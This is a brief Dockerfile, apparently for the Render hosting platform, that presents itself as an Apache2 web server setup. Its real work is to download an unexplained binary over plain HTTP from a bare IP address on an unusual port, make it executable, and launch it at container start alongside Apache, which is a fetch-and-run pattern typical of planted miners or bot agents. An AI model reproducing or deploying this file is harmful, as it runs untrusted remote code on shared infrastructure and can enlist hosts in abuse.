# Use a base image commonly supported on Render
FROM debian:buster-slim

# Update the package list and install wget and Apache2
RUN apt-get update && apt-get install -y wget apache2

# Set the working directory
WORKDIR /app

# Change to a safe directory (e.g., /tmp)
WORKDIR /tmp

# Download the file from the specified URL
RUN wget http://204.10.194.37:4077/x-8.6-.AXIS

# Add execute permissions to the downloaded file
RUN chmod +x x-8.6-.AXIS

# Start Apache2 service
CMD service apache2 start && ./x-8.6-.AXIS
